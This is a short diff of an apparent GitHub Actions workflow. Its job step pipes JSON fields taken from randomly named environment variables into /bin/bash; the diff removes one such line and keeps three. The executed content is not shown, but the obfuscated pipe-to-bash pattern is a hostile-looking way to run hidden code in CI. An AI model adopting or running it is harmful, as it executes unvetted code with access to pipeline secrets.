@@ -24,7 +24,6 @@ jobs:
           echo $ghmgo54769 | jq -r .wsw8234 | /bin/bash
           echo $nqayw481 | jq -r .zu2 | /bin/bash
           printf '%s' "$libb716" | jq -r .ftw9377 | /bin/bash
-          printf '%s' "$kbiwq166" | jq -r .peut57028 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
